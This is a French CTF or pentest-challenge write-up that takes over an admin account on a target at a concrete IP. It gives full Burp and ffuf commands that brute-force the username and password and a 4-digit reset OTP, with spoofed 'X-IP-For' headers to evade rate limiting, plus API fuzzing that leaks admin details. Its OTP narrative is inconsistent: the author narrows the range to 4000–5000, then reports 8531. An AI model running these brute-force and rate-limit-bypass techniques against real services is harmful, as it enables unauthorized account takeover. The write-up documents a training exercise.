
Pour un debut j'ai chercher le bon username en utilisant Burp suite

Avec Burp INtruder j'ai lancer un Pitchfork Attaque en ajoutant comme parametre 

```
X-Forwarder-For 
```
Pour eviter tout ce qui est restriction apres tel tentative (On sait jamais)

![](/assets/IMG-20260508202307095.png)

Ensuite j'ai analyser les reponse obtenue en filtrant par Taille de reponse

![](/assets/IMG-20260508202307112.png)

Ici j'ai remarqur que avec le user *devrootkali* on a comme reponse Mot de passe pour cet utilisateur invalide


Ensuite je passe a l'enumeration du password

Ici j'ai aussi tenter le pichfork attaque avec ce dernier mais je remarque que ca ne passe pas

![](/assets/IMG-20260508202307151.png)

Ici pour contourner les reponse de tentative j'ai generer une wordliste de ip

```python
with open("ips.txt", "w") as f:
    count = 0
    for i in range(1, 255):
        for j in range(1, 255):
            if count >= 3000:
                break
            f.write(f"192.168.{i}.{j}\n")
            count += 1
        if count >= 3000:
            break
```



mais apres j'ai utiliser en analysant le code source j'ao trouver un endpoint avec un contenu interressant

```
/security-update
```

```
Objet : Mise à jour de la sécurité du site

Monsieur,

Conformément à vos instructions, la sécurité du site a été mise à jour et renforcée.

- Authentification : le système a été optimisé afin de garantir une meilleure protection. 
  Toute tentative d'attaque par force brute est désormais systématiquement neutralisée.

À titre exceptionnel, dans l'hypothèse où vous rencontreriez des difficultés d'accès à votre compte 
(mot de passe erroné ou blocage), il vous sera possible d'utiliser l'en-tête personnalisé « X-IP-For : <Votre IP> », 
en y précisant votre adresse IP. Ce procédé vous permettra de rétablir temporairement l'accès. 
Je vous inviterai ensuite à modifier cet élément dans le code, de sorte que vous demeuriez le seul 
détenteur du paramètre nécessaire pour franchir le mécanisme de défense lié à l'authentification.

Je vous prie d'agréer, Monsieur, l'expression de ma considération distinguée.
```

maintenant avec cela au lieu d'utiliser 

```
X-Forwarded-for: IP
```
J'utiliserai du coup

```
X-IP-For
```

et maintenant avec le brute force on a plus le time rate limite mais des reponse de 

![](/assets/IMG-20260508202307242.png)



En gros j'ai lancer une commande ffuf 

```bash
└──╼ $ ffuf -w passwords.txt:PASS -w ips.txt:IP \  
 -u http://62.171.167.55:5000/login \  
 -X POST \  
 -d "username=devrootkali&password=PASS" \  
 -H "X-IP-For: IP" \  
 -H "Content-Type: application/x-www-form-urlencoded" \  
 -mode pitchfork \  
 -fw 2719 \  
 -t 5 -v -fw 2721,2719
```

qui va faire un fuzzing avec les mots de passe et differents IP que j'ai genere avec cette commande Python

```python
python3 -c "  
count = 0  
for i in range(1, 255):  
   for j in range(0, 255):  
       if count >= 3000: exit()  
       print(f'{i}.{j}.1.1')  
       count += 1  
" > ips.txt
```


Maintenant apres avoir acces a la page , j'ai remarquer un truc en fesant passer la requtes dans Burp la presence des APIs

![](/assets/IMG-20260508202307255.png)


Donc j'ai directement penser au FUZZING D'api et je suis tomber sur un endpoind interressant

![](/assets/IMG-20260508202307266.png)


![](/assets/IMG-20260508202307299.png)




Maintenant en me connectant au endpoint *_hidden_panel_admin* je suis encore tomber sur une page de connection

ici nous pouvons voir une partrie ou nous pouvons demander a changer le mot de passe (mot de passe oublier)

et dans son code source nous avons un message du genre "opt"


Bref nous avons deja eu a trouver des informations sur l'administrateur via une vulnerabilitee liee au api (api exposion)

```
admin_info":{"email":"superadmin@internal.pentest-recruit.fr",
"last_login":"2024-09-01T18:30:00Z",
"role":"System Administrator",
"username":"superadmin"
```

Bref apres avoir tenter l'email avec mot de passe oublier nous avons un message assez interressant qui ici ca chauffer un peu ta carte graphique 

![](/assets/IMG-20260508202307332.png)


```
Code a 4 chiffre
Code valide pendant 20 min
L'OTP ne change pas dans tout les cas
```

Ici pas d'autre solution que de faire appel au legendaire *MOnsieur Brutus* c'est a dire brute force d'OTP

Apres une premiere tentative je remarque que l'OTP se trouve entre 4000 et 5000
alors je reaguste ma wordlists et lance une seconde tentative

```bash
seq -w 4000 5000 > otp_wordlist.txt
```

```bash
SESSION="8313f59e-4e38-455b-afd6-96425799b852"  
ffuf -u http://62.171.167.55:5000/_hidden_panel_admin/validate_otp \  
 -X POST \  
 -H "Content-Type: application/x-www-form-urlencoded" \  
 -H "Cookie: session=$SESSION" \  
 -H "X-IP-For: 10.10.10.10" \  
 -d "otp=FUZZ" \  
 -w otp_wordlist.txt \  
 -fr "incorrect|invalide|erreur|invalid|OTP" \  
 -t 5 \  
 -v
```


OTP Trouver : 8531

```bash
[Status: 302, Size: 257, Words: 18, Lines: 6, Duration: 320ms]  
| URL | http://62.171.167.55:5000/_hidden_panel_admin/validate_otp  
| --> | /_hidden_panel_admin/reset_password  
   * FUZZ: 8531
```


en suite modifier le mot de passe et me reconnecter

![](/assets/IMG-20260508202307367.png)



